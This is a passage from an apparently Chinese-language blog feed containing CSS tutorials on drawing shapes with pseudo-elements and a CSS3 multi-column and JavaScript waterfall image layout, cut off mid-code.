class="line"><span class="selector-class">.search</span><span class="selector-pseudo">:after</span>, <span class="selector-class">.search</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">    <span class="attribute">border-style</span>: dashed dashed solid;</span><br><span class="line">    <span class="attribute">border-color</span>: transparent transparent <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">border-width</span>: <span class="number">0</span> <span class="number">10px</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: -<span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是值得注意的一点事IE6不支持transparent属性，但是我们可以通过设置对应的透明边框的border-style属性为dotted或是dashed即可解决这一问题。</p><p>接下来，我在总结几个常用的Css绘制的形状（结合before和after伪元素）：</p><h1 id="Talk-Bubble（聊天框）"><a href="#Talk-Bubble（聊天框）" class="headerlink" title="Talk Bubble（聊天框）"></a>Talk Bubble（聊天框）</h1><p><img src="https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712211029462-987687228.png" alt=""></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"> <span class="selector-id">#talkBubble</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">120px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#81cfa2</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">-webkit-border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">-moz-border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#talkBubble</span><span class="selector-pseudo">:before</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">26px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">13px</span> solid transparent;</span><br><span class="line">    <span class="attribute">border-right</span>: <span class="number">26px</span> solid <span class="number">#81cfa2</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">13px</span> solid transparent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Heart（心形）"><a href="#Heart（心形）" class="headerlink" title="Heart（心形）"></a>Heart（心形）</h1><p><img src="https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712211913103-1917538141.png" alt=""></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#Heart</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">90px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#Heart</span><span class="selector-pseudo">:before</span>,</span><br><span class="line"><span class="selector-id">#Heart</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">80px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#FE4C40</span>;</span><br><span class="line">    <span class="attribute">-moz-border-radius</span>: <span class="number">50px</span> <span class="number">50px</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50px</span> <span class="number">50px</span> <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">rotate</span>(-45deg);</span><br><span class="line">    <span class="attribute">-moz-transform</span>: <span class="built_in">rotate</span>(-45deg);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(-45deg);</span><br><span class="line">    <span class="attribute">-webkit-transform-origin</span>: <span class="number">0</span> <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">-moz-transform-origin</span>: <span class="number">0</span> <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">transform-origin</span>: <span class="number">0</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#Heart</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">-webkit-transform</span>: <span class="built_in">rotate</span>(45deg);</span><br><span class="line">    <span class="attribute">-moz-transform</span>: <span class="built_in">rotate</span>(45deg);</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">rotate</span>(45deg);</span><br><span class="line">    <span class="attribute">-webkit-transform-origin</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">-moz-transform-origin</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">transform-origin</span>: <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>css可以绘制很多你想不到形状，熟练掌握一些常用的css绘制图形的技巧可以让你在项目中游刃有余。</p><p><img src="https://images2015.cnblogs.com/blog/1140602/201707/1140602-20170712214809806-1604376037.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> HTML/CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>css3多栏属性&amp;&amp;JS实现瀑布流</title>
      <link href="/2017/06/14/js-css-waterfall20170614/"/>
      <url>/2017/06/14/js-css-waterfall20170614/</url>
      
        <content type="html"><![CDATA[<h1 id="css3多列"><a href="#css3多列" class="headerlink" title="css3多列"></a>css3多列</h1><p>1）首提的兼容性问题：IE10以及opera支持多列（column），chrome需要-webkit-前缀，Firefox需要-moz-的前缀，Ie9以及更早版本就不支持多列了。你可以使用这个工具，很方便的查看你的浏览器内核以及版本信息<a href="http://ie.icoa.cn/" target="_blank" rel="noopener">http://ie.icoa.cn/</a></p><p>2）Css3多列属性:css3多列主要是五个属性</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">column-count　　  // &lt;规定元素被分隔的列数&gt;</span><br><span class="line">column-gap　　　  // &lt;规定列与列之间的间隔&gt;</span><br><span class="line">column-rule　　   // &lt;列之间的宽度、样式、颜色&gt;</span><br><span class="line">column-width     // &lt;列的宽度&gt;</span><br><span class="line">column-span      // &lt;元素应该横跨的列数&gt;</span><br></pre></td></tr></table></figure><p>注意：在设置column-width宽度时，同时设置盒子的width，否则宽度默认为100%，每栏宽度按栏数平均分；盒子每栏宽度必须大于等于column-width设定的值，否则就会减少栏数来增加每栏宽度</p><a id="more"></a><h1 id="css3多列和JS实现瀑布流"><a href="#css3多列和JS实现瀑布流" class="headerlink" title="css3多列和JS实现瀑布流"></a>css3多列和JS实现瀑布流</h1><p>给自己安利一波吧，第一次看到瀑布流是在pinterest的官网</p><p>自己也梳理梳理逻辑：&lt;在写js代码之前，一定要先搞清逻辑，再动手写代码&gt;</p><p>我们都不陌生瀑布流是同宽的，但是高度不一，js主要的工作就是根据高度来进行布局，</p><blockquote><p>1）当一行排满后，准备排第二行的时候，把第一个图片放到上一行图片高度最小处，以此类推，另外有一点就是自动加载，这里我做一个条件来判断是否加载，</p></blockquote><blockquote><p>2）当最后一个的元素距离网页顶部的高度（offsetTop）+ 这个元素高度的一半 &lt; 垂直方向上滚轮的量（scrollTop） + 网页可见区域的高 时：我们就加载图片（这里我没有用ajax请求，我用了一个json数组来模拟json数据）</p></blockquote><p>要搞清楚offsetTop、scrollTop、clientHeight这些API，可以查看MDN文档。</p><p>梳理完逻辑，让我们动手写代码吧：</p><p>html比较简单，这里图片我用了placehold的图片占位符，如果你没有很好的素材，这也许是个不错的选择</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main clearfix"</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x200"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x200"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x150"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x200"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x200"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x200"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x100"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x150"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x200"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"pic"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://placehold.it/200x300"</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>css用了多列的column-width和column-gap属性</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>,</span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    <span class="attribute">display</span>: table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.main</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">-webkit-column-width</span>: <span class="number">210px</span>;</span><br><span class="line">    <span class="attribute">-webkit-column-gap</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">-moz-column-gap</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">float</span>: left;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">15px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> <span class="selector-class">.pic</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: auto;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0px</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.box</span> <span class="selector-class">.pic</span> <span class="selector-tag">img</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>梳理完了逻辑，该动手写js了</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    waterfall(<span class="string">'main'</span>, <span class="string">'box'</span>);</span><br><span class="line">    <span class="keyword">var</span> ImgJson = &#123;</span><br><span class="line">        <span class="string">'data'</span>: [</span><br><span class="line">            &#123;<span class="string">'src'</span>: <span class="string">'http://placehold.it/200x300'</span>&#125;</span><br><span class="line"></span><br><span class="line">        ]</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//监听scroll事件</span></span><br><span class="line">    <span class="built_in">window</span>.onscroll = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> isPosting = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (checkScrollSlide(<span class="string">'main'</span>, <span class="string">'box'</span>) &amp;&amp; !isPosting) &#123;</span><br><span class="line">            <span class="keyword">var</span> oParent = <span class="built_in">document</span>.getElementById(<span class="string">'main'</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> ImgJson.data) &#123;</span><br><span class="line">                <span class="keyword">var</span> oBox = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">                oBox.className = <span class="string">'box'</span>;</span><br><span class="line">                oBox.innerHTML = <span class="string">'&lt;div class="pic"&gt;&lt;img src="'</span> + ImgJson.data[i].src + <span class="string">'"&gt;&lt;/div&gt;'</span>;</span><br><span class="line">                oParent.appendChild(oBox);</span><br><span class="line">            &#125;</span><br><span class="line">            isPosting = <span class="literal">false</span>;</span><br><span class="line">            waterfall(<span class="string">'main'</span>, <span class="string">'box'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waterfall</span>(<span class="params">parent, clsName</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//获取元素</span></span><br><span class="line">    <span class="keyword">var</span> oParent = <span class="built_in">document</span>.getElementById(parent);</span><br><span class="line">    <span class="comment">//获取所有box</span></span><br><span class="line">    <span class="keyword">var</span> aBoxArr = oParent.getElementsByClassName(clsName);</span><br><span class="line">    <span class="comment">//单个box的宽度</span></span><br><span class="line">    <span class="keyword">var</span> iBoxw = aBoxArr[<span class="number">0</span>].offsetWidth;</span><br><span class="line">    <span class="comment">//列数</span></span><br><span class="line">    <span class="keyword">var</span> cols = <span class="built_in">Math</span>.floor(<span class="built_in">document</span>.documentElement.clientWidth / iBoxw);</span><br><span class="line">    oParent.style.cssText = <span class="string">'width:'</span> + iBoxw * (cols + <span class="number">1</span>) + <span class="string">'px;margin:0 auto;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//储存所有高度</span></span><br><span class="line">    <span class="keyword">var</span> hArr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; aBoxArr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; cols) &#123;</span><br><span class="line">            hArr[i] = aBoxArr[i].offsetHeight;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//获取hArr的最小值</span></span><br><span class="line">            <span class="keyword">var</span> minH = <span class="built_in">Math</span>.min.apply(<span class="literal">null</span>, hArr);</span><br><span class="line">            <span class="comment">//hArr最小值索引index</span></span><br><span class="line">            <span class="keyword">var</span> minHIndex = getMinHIndex(hArr, minH);</span><br><span class="line">            aBoxArr[i].style.cssText 